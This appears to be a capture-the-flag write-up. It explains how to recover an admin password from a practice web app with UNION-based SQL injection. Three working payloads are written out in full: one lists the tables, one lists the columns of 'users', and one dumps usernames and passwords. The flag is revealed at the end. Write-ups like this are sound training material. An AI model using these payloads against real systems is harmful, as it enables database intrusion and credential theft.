This problem builds off the last problem in that you need to retrive a password from a user
in the database. Like the previous problem, we can get a list of all the tables by sending the following
query:

' UNION SELECT table_name, table_name, table_name from information_schema.tables --

As expected, there is a users table that we need to query.
However, we can't just select everything from the users table, since the number of columns do not match.

Thus, we need to know the names of the columns in the users table.
Similar to information_schema.tables, we can query information_schema.columns for all the columns in the database
that belong to the table "users".

' UNION SELECT column_name, column_name, column_name from information_schema.columns where table_name = "users" --

Now we know that there are 5 columns: id, username, password, name, and description. Pretty basic.

Our final query is
' UNION SELECT id, username, password from users --

The admin user's password is flag{pa55w0rd5_ar3_b1g_s3cr3t5}
